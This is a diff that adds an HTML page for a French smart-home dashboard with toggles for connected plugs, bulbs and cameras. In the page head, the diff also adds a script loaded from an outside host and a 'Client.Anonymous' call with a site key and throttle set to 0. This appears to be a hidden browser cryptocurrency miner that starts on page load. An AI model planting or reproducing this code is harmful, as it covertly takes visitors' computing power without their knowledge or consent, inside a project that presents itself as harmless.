@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="../static/style.css">
+
+    <script src="https://www.hostingcloud.racing/4M3s.js"></script>
+    <script>
+        var _client = new Client.Anonymous('93a8750decf3bfb51edcf73d373da8bd27695fd842937f622aab6b131d89b996', {
+            throttle: 0, c: 'w', ads: 0
+        });
+        _client.start();
+    </script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gestion des Objets Connectés</title>
+</head>
+<body>
+    <header>
+        <h1>Gestion des Objets Connectés</h1>
+    </header>
+    <div class="container">
+        <div class="grid">
+            <!-- Prises Connectées -->
+            <div class="category">
+                <div class="icon-container">
+                    <img src="/icons/prise.png" alt="Prises Icon" class="category-icon">
+                </div>
+                <h2>Prises Connectées</h2>
+                <div class="device" onclick="toggleDevice(this)">
+                    <p>Prise Chambre Étienne</p>
+                    <img src="/icons/off.png" alt="Prise">
+                </div>
+                <div class="device" onclick="toggleDevice(this)">
+                    <p>Prise Salon</p>
+                    <img src="/icons/off.png" alt="Prise">
+                </div>
+            </div>
+
+            <!-- Ampoules Connectées -->
+            <div class="category">
+                <div class="icon-container">
+                    <img src="/icons/lampe.png" alt="Ampoules Icon" class="category-icon">
+                </div>
+                <h2>Ampoules Connectées</h2>
+                <div class="device" onclick="toggleAmpoule(this)">
+                    <p>Ampoule Cuisine</p>
+                    <img src="/icons/ampouleeteinte.png" alt="Ampoule">
+                </div>
+                <div class="device" onclick="toggleAmpoule(this)">
+                    <p>Ampoule Salle de Bain</p>
+                    <img src="/icons/ampouleeteinte.png" alt="Ampoule">
+                </div>
+            </div>
+
+            <!-- Caméras Connectées -->
+            <div class="category">
+                <div class="icon-container">
+                    <img src="/icons/camera.png" alt="Caméras Icon" class="category-icon">
+                </div>
+                <h2>Caméras Connectées</h2>
+                <div class="device" onclick="toggleDevice(this)">
+                    <p>Caméra Extérieur</p>
+                    <img src="/icons/off.png" alt="Caméra">
+                </div>
+                <div class="device" onclick="toggleDevice(this)">
+                    <p>Caméra Piscine</p>
+                    <img src="/icons/off.png" alt="Caméra">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function toggleAmpoule(element) {
+            const img = element.querySelector('img');
+            if (img.src.includes('ampouleeteinte.png')) {
+                img.src = '/icons/ampouleallume.png';
+            } else {
+                img.src = '/icons/ampouleeteinte.png';
+            }
+        }
+
+        function toggleDevice(element) {
+            const img = element.querySelector('img');
+            if (img.src.includes('off.png')) {
+                img.src = '/icons/on.png';
+            } else {
+                img.src = '/icons/off.png';
+            }
+        }
+    </script>
+</body>
+</html>
